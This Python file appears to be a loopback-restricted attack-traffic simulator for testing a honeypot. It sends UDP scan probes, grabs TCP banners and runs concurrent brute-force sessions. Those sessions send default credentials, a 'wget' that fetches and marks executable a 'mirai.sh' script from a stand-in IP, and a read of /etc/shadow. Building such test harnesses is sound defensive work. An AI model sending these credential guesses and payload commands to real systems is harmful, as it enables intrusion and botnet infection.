import argparse
import asyncio
import random
import struct
import time
from dataclasses import dataclass, field
from typing import List, Tuple


@dataclass
class SimMetrics:
    udp_sent: int = 0
    udp_replies: int = 0
    udp_errors: int = 0
    tcp_handshakes: int = 0
    tcp_banners: List[str] = field(default_factory=list)
    tcp_payload_turns: int = 0
    tcp_failures: int = 0


class SimulatorUDPProtocol(asyncio.DatagramProtocol):
    """Handles outbound UDP probes and counts non-blocking decoy replies."""

    def __init__(self, metrics: SimMetrics) -> None:
        self.metrics = metrics
        self.transport: asyncio.DatagramTransport | None = None

    def connection_made(self, transport: asyncio.BaseTransport) -> None:
        self.transport = transport  # type: ignore[assignment]

    def datagram_received(self, data: bytes, addr: Tuple[str, int]) -> None:
        self.metrics.udp_replies += 1
        print(
            f"  [UDP RECV] {addr[0]}:{addr[1]} -> {len(data)}B "
            f"(hex={data.hex()})"
        )

    def error_received(self, exc: Exception) -> None:
        self.metrics.udp_errors += 1


def build_dns_probe(domain: str = "internal.corp") -> bytes:
    """Constructs a minimal binary DNS A-record query datagram."""
    tx_id = random.randint(0, 65535)
    header = struct.pack("!HHHHHH", tx_id, 0x0100, 1, 0, 0, 0)
    qname = b"".join(
        bytes([len(label)]) + label.encode("ascii") for label in domain.split(".")
    ) + b"\x00"
    question = struct.pack("!HH", 1, 1)
    return header + qname + question


async def run_udp_sweep(
    host: str,
    ports: List[int],
    metrics: SimMetrics,
    burst_count: int = 12,
) -> None:
    """Sends rapid stateless UDP datagrams to test sensor ingestion and rate limits."""
    print(f"\n[STAGE 1] Launching UDP Recon Sweep ({burst_count} datagrams)...")
    loop = asyncio.get_running_loop()
    local_bind = ("::1", 0) if ":" in host else ("0.0.0.0", 0)
    transport, _ = await loop.create_datagram_endpoint(
        lambda: SimulatorUDPProtocol(metrics),
        local_addr=local_bind,
    )

    probes = [
        build_dns_probe("db-prod.local"),
        b"\x30\x26\x02\x01\x01\x04\x06public\xa0\x19",
        b"\xff\xfe\xfd\xfcMALFORMED_SCAN_PROBE",
    ]

    try:
        for i in range(burst_count):
            target_port = ports[i % len(ports)]
            payload = probes[i % len(probes)]
            transport.sendto(payload, (host, target_port))
            metrics.udp_sent += 1
            await asyncio.sleep(0.03)

        await asyncio.sleep(0.4)
    finally:
        transport.close()


async def run_tcp_banner_grab(
    host: str,
    port: int,
    metrics: SimMetrics,
) -> None:
    """Completes a TCP 3-way handshake, reads the banner, and disconnects."""
    t0 = time.perf_counter()
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=3.0
        )
        metrics.tcp_handshakes += 1
        banner = await asyncio.wait_for(reader.read(256), timeout=3.0)
        rtt_ms = (time.perf_counter() - t0) * 1000
        decoded = banner.decode("utf-8", errors="replace").strip()
        metrics.tcp_banners.append(f"{port}: {decoded}")
        print(f"  [TCP BANNER] {host}:{port} ({rtt_ms:.1f} ms) -> {decoded!r}")

        if port == 2222:
            writer.write(b"SSH-2.0-libssh_0.9.6_Scanner\r\n")
            await writer.drain()

        writer.close()
        await writer.wait_closed()
    except (OSError, asyncio.TimeoutError) as exc:
        metrics.tcp_failures += 1
        print(f"  [TCP ERROR] {host}:{port} -> {exc}")


async def run_tcp_bruteforce(
    host: str,
    port: int,
    metrics: SimMetrics,
    session_label: str,
) -> None:
    """Simulates a stateful credential brute-force and shell payload sequence."""
    attack_turns = [
        b"root:123456\r\n",
        b"admin:admin\r\n",
        b"ubuntu:ubuntu2026\r\n",
        b"wget http://198.51.100.42/mirai.sh -O /tmp/.x; chmod +x /tmp/.x\r\n",
        b"cat /etc/shadow && uname -a\r\n",
    ]

    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=3.0
        )
        metrics.tcp_handshakes += 1

        banner = await asyncio.wait_for(reader.read(256), timeout=3.0)
        print(
            f"  [TCP SESSION {session_label}] Connected to :{port} | "
            f"Banner={banner.decode('utf-8', errors='replace').strip()!r}"
        )

        for turn_idx, payload in enumerate(attack_turns, start=1):
            writer.write(payload)
            await writer.drain()
            metrics.tcp_payload_turns += 1

            reply = await asyncio.wait_for(reader.read(256), timeout=3.0)
            if not reply:
                print(f"  [TCP SESSION {session_label}] Server closed connection at turn {turn_idx}.")
                break
            await asyncio.sleep(0.15)

        writer.close()
        await writer.wait_closed()
        print(f"  [TCP SESSION {session_label}] Completed {len(attack_turns)} payload turns.")
    except (OSError, asyncio.TimeoutError) as exc:
        metrics.tcp_failures += 1
        print(f"  [TCP SESSION {session_label}] Failed: {exc}")


async def run_campaign(host: str, scenario: str, concurrency: int) -> None:
    metrics = SimMetrics()
    udp_ports = [15353, 11610]
    tcp_ports = [2222, 2323]

    if scenario in ("udp_sweep", "correlated"):
        await run_udp_sweep(host, udp_ports, metrics, burst_count=12)

    if scenario in ("tcp_banner", "correlated"):
        print("\n[STAGE 2] Launching Concurrent TCP Banner Grabs...")
        await asyncio.gather(
            *(run_tcp_banner_grab(host, p, metrics) for p in tcp_ports)
        )

    if scenario in ("tcp_bruteforce", "correlated"):
        print(f"\n[STAGE 3] Launching {concurrency} Stateful TCP Brute-Force Sessions...")
        tasks = [
            run_tcp_bruteforce(
                host,
                tcp_ports[i % len(tcp_ports)],
                metrics,
                session_label=f"BOT-{i + 1:02d}",
            )
            for i in range(concurrency)
        ]
        await asyncio.gather(*tasks)

    print("\n" + "=" * 54)
    print("SIMULATION TELEMETRY SUMMARY")
    print("=" * 54)
    print(f"UDP Datagrams Sent      : {metrics.udp_sent}")
    print(f"UDP Decoy Replies Recv  : {metrics.udp_replies} (capped at 5/10s by honeypot)")
    print(f"TCP Handshakes Completed: {metrics.tcp_handshakes}")
    print(f"TCP Payload Turns Sent  : {metrics.tcp_payload_turns}")
    print(f"Socket/Timeout Failures : {metrics.tcp_failures + metrics.udp_errors}")
    print("=" * 54)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Local dual-protocol attack simulator for honeypot testing."
    )
    parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="Target IP address (restricted to loopback 127.0.0.1 by default).",
    )
    parser.add_argument(
        "--scenario",
        choices=["udp_sweep", "tcp_banner", "tcp_bruteforce", "correlated"],
        default="correlated",
        help="Traffic profile to execute.",
    )
    parser.add_argument(
        "--concurrency",
        type=int,
        default=4,
        help="Number of concurrent TCP brute-force sessions.",
    )
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()
    if args.host not in ("127.0.0.1", "localhost", "::1"):
        raise SystemExit("Safety check: restrict simulator target to loopback addresses.")

    try:
        asyncio.run(run_campaign(args.host, args.scenario, args.concurrency))
    except KeyboardInterrupt:
        pass
